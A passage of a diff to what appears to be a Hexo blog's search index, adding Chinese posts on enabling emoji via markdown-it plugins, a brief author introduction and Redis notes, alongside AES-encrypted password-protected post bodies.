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 </div>]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>在Markdown中使用emoji表情</title>
+    <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
+    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
+<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
+<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
+<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
+<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
+<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
+<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
+<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
+<pre><code>npm un hexo-renderer-marked -S
+</code></pre>
+<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
+<pre><code>npm i hexo-renderer-markdown-it -S
+</code></pre>
+<p>完成之后安装所需的插件：</p>
+<pre><code>npm i markdown-it-emoji -S
+</code></pre>
+<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
+<pre><code>markdown:
+  render:
+    html: true # 在 markdown 文本中支持 html tag 标签
+    xhtmlOut: false # 需要 xtml 文档，使用 &lt;br /&gt; 替代 &lt;br&gt;
+    breaks: true # 用 &lt;br&gt; 开始新的一行
+    linkify: true # 自动将 可能是链接的内容转换成链接
+    typographer: true # 印刷标识转换
+  plugins:
+    - markdown-it-emoji # emoji表情插件
+    - markdown-it-abbr # 可选
+    - markdown-it-footnote # 可选
+    - markdown-it-ins # 可选，
+    - markdown-it-sub # 可选，下标，如H2O
+    - markdown-it-sup # 可选，上标，如2^10
+  anchors:
+    level: 2
+    collisionSuffix: ''
+    permalink: false,
+    permalinkClass: 'header-anchor'
+    permalinkSymbol: ''
+    case: 0
+    separator: ''
+</code></pre>
+<p>然后保存退出，再重新加载一下hexo即可。</p>
+<pre><code>hexo clean
+hexo generate
+hexo server
+</code></pre>
+<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Markdown</category>
+      </categories>
+      <tags>
+        <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>At the very beginning...</title>
+    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
+    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
+<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
+<p>0.有自己的博客听起来更屌一点。</p>
+<p>1.记录和分享一些学到的东西。</p>
+<p>2.倒逼自己去学一些新东西。</p>
+<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
+<p>信息安全菜鸡</p>
+<p>偶尔打打ctf找虐</p>
+<p>业余爱好拳击，徒步</p>
+<p>QQ：MTc1NTkzNjEyOQ</p>
+<p>欢迎交流 ~</p>
+]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Redis笔记</title>
+    <url>/2022/12/27/%E5%B7%A5%E5%85%B7/redis/</url>
+    <content><![CDATA[<h2 id="Redis是什么"><a class="header-anchor" href="#Redis是什么"></a>Redis是什么</h2>
+<p>概括地说：Redis是一个内存数据库（in-memory data store，说白话就是所有的数据都在内存里放着，不过有些内存数据库产品如Redis，在关机、断电等特殊情况下会把数据dump到硬盘里以便后续恢复），但又可以当做<strong>缓存</strong>或者<strong>消息中间件</strong>去使用。</p>
+<h2 id="Redis怎么用"><a class="header-anchor" href="#Redis怎么用"></a>Redis怎么用</h2>
+<h3 id="作为缓存使用"><a class="header-anchor" href="#作为缓存使用"></a>作为缓存使用</h3>
+<p>因为Redis的速度很快，所以可以拿他来缓存一些数据库请求数据、复杂的计算结果、API调用结果、用户的会话状态等，从而提高程序的执行速度。</p>
+<h3 id="作为消息中间件使用"><a class="header-anchor" href="#作为消息中间件使用"></a>作为消息中间件使用</h3>
+<p>在一个异步程序中，有7个线程负责从硬盘的不同目录去取待处理的数据，1个线程去对取来的数据做运算。这时候就可以把Redis当做消息队列来用，取数据的线程把每次取来的数据丢到Redis里面，处理数据的线程只管从Redis里面取数据然后加工，而Redis就起到一个容器+传送带的作用，每个线程都有明确的分工，整个程序的逻辑也更清晰。</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>消息队列</tag>
+        <tag>redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dark web</title>
+    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
+    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
+      <categories>
+        <category>杂记</category>
       </categories>
   </entry>
   <entry>
@@ -721,39 +1539,100 @@ echo &quot;export GOPROXY=https://goproxy.io,direct&quot; &gt;&gt; ~/.zshrc &amp
       </categories>
   </entry>
   <entry>
-    <title>dark web</title>
-    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
-    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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